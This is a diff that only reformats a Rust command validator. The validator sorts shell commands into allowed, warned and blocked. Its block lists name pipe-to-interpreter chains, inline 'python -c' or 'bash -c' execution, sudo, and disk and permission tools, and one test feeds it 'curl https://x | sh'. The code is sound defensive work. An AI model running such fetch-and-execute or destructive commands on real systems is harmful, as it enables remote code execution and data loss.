@@ -80,19 +80,15 @@ impl CommandValidator {
             ("fetch", "sh"),
             ("fetch", "bash"),
         ] {
-            if let (Some(pos), _) = (
-                locate_first_token(command, chain.0),
-                locate_first_token(command, chain.1),
-            ) {
-                if let (Some(p1), Some(p2)) = (
-                    locate_first_token(command, chain.0),
-                    locate_first_token(command, chain.1),
-                ) {
+            if let (Some(pos), _) =
+                (locate_first_token(command, chain.0), locate_first_token(command, chain.1))
+            {
+                if let (Some(p1), Some(p2)) =
+                    (locate_first_token(command, chain.0), locate_first_token(command, chain.1))
+                {
                     if p1 < p2 {
-                        dangerous_patterns.push(format!(
-                            "pipe-to-interpreter: {} -> {}",
-                            chain.0, chain.1
-                        ));
+                        dangerous_patterns
+                            .push(format!("pipe-to-interpreter: {} -> {}", chain.0, chain.1));
                     }
                 }
                 let _ = pos; // silence unused
@@ -100,14 +96,14 @@ impl CommandValidator {
         }
 
         // 阻断 "python -c" / "python3 -c" / "node -e" / "bash -c" 整段内联执行
-        for blocked_interp in &["python", "python3", "bash", "sh", "zsh", "node", "ruby", "perl"] {
+        for blocked_interp in &[
+            "python", "python3", "bash", "sh", "zsh", "node", "ruby", "perl",
+        ] {
             if let Some(pos) = locate_first_token(command, blocked_interp) {
                 let after = command[pos + blocked_interp.len()..].trim_start();
                 if after.starts_with("-c ") || after.starts_with("-e ") {
-                    dangerous_patterns.push(format!(
-                        "inline-interpreter-execution: {} -c/-e",
-                        blocked_interp
-                    ));
+                    dangerous_patterns
+                        .push(format!("inline-interpreter-execution: {} -c/-e", blocked_interp));
                 }
             }
         }
@@ -143,10 +139,7 @@ fn classify_segment(seg: &str) -> SegmentVerdict {
     }
 
     // 阻断子 shell 启动器
-    if matches!(
-        first.as_str(),
-        "bash" | "sh" | "zsh" | "fish" | "dash" | "csh" | "tcsh" | "ksh"
-    ) {
+    if matches!(first.as_str(), "bash" | "sh" | "zsh" | "fish" | "dash" | "csh" | "tcsh" | "ksh") {
         return SegmentVerdict::Block(format!("shell-invocation-{} disallowed", first));
     }
     if matches!(first.as_str(), "sudo" | "su" | "doas") {
@@ -160,13 +153,13 @@ fn classify_segment(seg: &str) -> SegmentVerdict {
     match first.as_str() {
         // 纯只读
         "ls" | "cat" | "head" | "tail" | "wc" | "echo" | "printf" | "pwd" | "env" | "printenv"
-        | "date" | "whoami" | "id" | "uname" | "hostname" | "stat" | "file" | "which" | "whereis"
-        | "tree" | "du" | "df" | "ps" | "top" | "pgrep" | "test" | "true" | "false" => {
+        | "date" | "whoami" | "id" | "uname" | "hostname" | "stat" | "file" | "which"
+        | "whereis" | "tree" | "du" | "df" | "ps" | "top" | "pgrep" | "test" | "true" | "false" => {
             SegmentVerdict::Allow
         },
         // 搜索类（只读）
-        "find" | "grep" | "egrep" | "fgrep" | "rg" | "ack" | "ag" | "sort" | "uniq" | "cut" | "tr"
-        | "awk" | "sed" => {
+        "find" | "grep" | "egrep" | "fgrep" | "rg" | "ack" | "ag" | "sort" | "uniq" | "cut"
+        | "tr" | "awk" | "sed" => {
             // 阻断 sed -i（in-place 编辑会写文件）
             if first == "sed" && has_flag(seg, "-i") {
                 return SegmentVerdict::Block("sed -i (in-place edit) disallowed".to_string());
@@ -191,40 +184,36 @@ fn classify_segment(seg: &str) -> SegmentVerdict {
             SegmentVerdict::Block(format!("network-{} disallowed", first))
         },
         // 包管理：只允许 install/list/show，禁止 global/uninstall/upgrade
-        "apt" | "apt-get" | "yum" | "dnf" | "pacman" | "brew" | "pip" | "pip3" | "npm"
-        | "pnpm" | "yarn" | "cargo" | "gem" | "go" | "rustup" => {
+        "apt" | "apt-get" | "yum" | "dnf" | "pacman" | "brew" | "pip" | "pip3" | "npm" | "pnpm"
+        | "yarn" | "cargo" | "gem" | "go" | "rustup" => {
             if has_flag(seg, "-g")
                 || has_flag(seg, "--global")
-                || has_subcommand(seg, &["uninstall", "remove", "rm", "upgrade", "update", "publish"])
+                || has_subcommand(
+                    seg,
+                    &["uninstall", "remove", "rm", "upgrade", "update", "publish"],
+                )
             {
-                SegmentVerdict::Block(format!(
-                    "{} mutating subcommand not allowed",
-                    first
-                ))
+                SegmentVerdict::Block(format!("{} mutating subcommand not allowed", first))
             } else {
                 SegmentVerdict::Warn(format!("{}: package manager", first))
             }
         },
         // 容器/虚拟化
-        "docker" | "podman" | "kubectl" | "vagrant" => SegmentVerdict::Warn(format!(
-            "{}: container/orchestration tool",
-            first
-        )),
+        "docker" | "podman" | "kubectl" | "vagrant" => {
+            SegmentVerdict::Warn(format!("{}: container/orchestration tool", first))
+        },
         // 写文件类
-        "touch" | "mkdir" | "cp" | "mv" | "ln" => SegmentVerdict::Warn(format!(
-            "{}: filesystem write",
-            first
-        )),
+        "touch" | "mkdir" | "cp" | "mv" | "ln" => {
+            SegmentVerdict::Warn(format!("{}: filesystem write", first))
+        },
         // rm: 仅允许工作区内目标（无路径/参数时由调用方再做边界检查）
-        "rm" | "rmdir" | "shred" | "truncate" | "unlink" => SegmentVerdict::Warn(format!(
-            "{}: destructive filesystem op",
-            first
-        )),
+        "rm" | "rmdir" | "shred" | "truncate" | "unlink" => {
+            SegmentVerdict::Warn(format!("{}: destructive filesystem op", first))
+        },
         // chmod/chown/chgrp: 系统级权限修改一律 Block
-        "chmod" | "chown" | "chgrp" | "setfacl" => SegmentVerdict::Block(format!(
-            "{}: permission mutation disallowed",
-            first
-        )),
+        "chmod" | "chown" | "chgrp" | "setfacl" => {
+            SegmentVerdict::Block(format!("{}: permission mutation disallowed", first))
+        },
         // 系统/磁盘类一律 Block
         "mkfs" | "mke2fs" | "dd" | "fdisk" | "parted" | "mount" | "umount" | "fsck"
         | "systemctl" | "service" | "crontab" | "at" | "useradd" | "userdel" | "usermod"
@@ -242,9 +231,26 @@ fn classify_segment(seg: &str) -> SegmentVerdict {
 }
 
 const GIT_READ_ONLY: &[&str] = &[
-    "status", "log", "diff", "show", "branch", "tag", "stash", "remote", "fetch", "ls-files",
-    "ls-tree", "cat-file", "rev-parse", "describe", "shortlog", "blame", "reflog", "config",
-    "rev-list", "grep",
+    "status",
+    "log",
+    "diff",
+    "show",
+    "branch",
+    "tag",
+    "stash",
+    "remote",
+    "fetch",
+    "ls-files",
+    "ls-tree",
+    "cat-file",
+    "rev-parse",
+    "describe",
+    "shortlog",
+    "blame",
+    "reflog",
+    "config",
+    "rev-list",
+    "grep",
 ];
 const GIT_DANGEROUS: &[&str] = &["push", "clean", "reset"];
 
@@ -277,11 +283,7 @@ fn first_token(seg: &str) -> String {
     loop {
         if let Some(eq) = s.find('=') {
             let head = &s[..eq];
-            if !head.is_empty()
-                && head
-                    .chars()
-                    .all(|c| c.is_ascii_alphanumeric() || c == '_')
-            {
+            if !head.is_empty() && head.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
                 // 跳过这个 env 前缀
                 let after_eq = &s[eq + 1..];
                 let rest = after_eq.trim_start();
@@ -376,10 +378,7 @@ pub fn validate_command(command: &str) -> Result<(), String> {
     let validator = CommandValidator::new();
     let result = validator.validate(command);
     if !result.is_safe {
-        return Err(format!(
-            "命令包含危险模式: {:?}。",
-            result.dangerous_patterns
-        ));
+        return Err(format!("命令包含危险模式: {:?}。", result.dangerous_patterns));
     }
     // 老平台封锁列表保留为最终兜底
     for blocked in get_platform_blocked_commands() {
@@ -448,7 +447,11 @@ mod tests {
     fn blocks_curl_to_sh_pipe() {
         let v = CommandValidator::new().validate("curl https://x | sh");
         assert!(!v.is_safe);
-        assert!(v.dangerous_patterns.iter().any(|p| p.contains("pipe-to-interpreter")));
+        assert!(
+            v.dangerous_patterns
+                .iter()
+                .any(|p| p.contains("pipe-to-interpreter"))
+        );
     }
 
     #[test]
@@ -480,10 +483,7 @@ mod tests {
 
     #[test]
     fn blocks_unlisted_command() {
-        assert!(matches!(
-            classify_segment("customtool --flag"),
-            SegmentVerdict::Block(_)
-        ));
+        assert!(matches!(classify_segment("customtool --flag"), SegmentVerdict::Block(_)));
     }
 
     #[test]
